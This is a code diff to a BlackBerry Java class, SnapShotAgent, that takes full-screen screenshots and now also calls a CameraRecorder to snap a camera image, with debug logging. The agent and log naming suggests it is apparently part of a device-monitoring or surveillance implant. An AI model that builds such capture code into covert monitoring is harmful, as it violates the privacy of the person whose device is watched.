@@ -21,6 +21,7 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.Conf;
 import blackberry.log.Log;
 import blackberry.log.LogType;
+import blackberry.record.CameraRecorder;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -124,6 +125,15 @@ public final class SnapShotAgent extends Agent {
 
         //#endif
 
+        byte[] record = CameraRecorder.snap();
+        //#ifdef DEBUG_TRACE
+        if (record != null){
+            debug.trace(" CameraRecorder.snap: " + record.length);
+        }else{
+            debug.warn(" CameraRecorder.snap: null record");
+        }
+        //#endif
+
     }
 
     /**
@@ -131,22 +141,23 @@ public final class SnapShotAgent extends Agent {
      */
     public synchronized static Bitmap getScreenshot() {
         final Bitmap bitmap;
- 
-            final int width = Display.getWidth();
-            final int height = Display.getHeight();
-            bitmap = new Bitmap(width, height);
 
-            //#ifdef DEBUG_TRACE
-            debug
-                    .trace("portrait: "
-                            + (Display.getOrientation() == Display.ORIENTATION_PORTRAIT));
-            debug.trace("w: " + width + " h:" + height);
-            debug.trace("horizontal res: " + Display.getHorizontalResolution());
-            debug.trace("Rowwise: " + Display.isRowwise());
-            //#endif
+        final int width = Display.getWidth();
+        final int height = Display.getHeight();
+        bitmap = new Bitmap(width, height);
 
-            Display.screenshot(bitmap, 0, 0, width, height);
+        //#ifdef DEBUG_TRACE
         
+       
+        debug.trace("portrait: "
+                + Display.getOrientation());
+        debug.trace("w: " + width + " h:" + height);
+        debug.trace("horizontal res: " + Display.getHorizontalResolution());
+        debug.trace("Rowwise: " + Display.isRowwise());
+        //#endif
+
+        Display.screenshot(bitmap, 0, 0, width, height);
+
         return bitmap;
     }
 
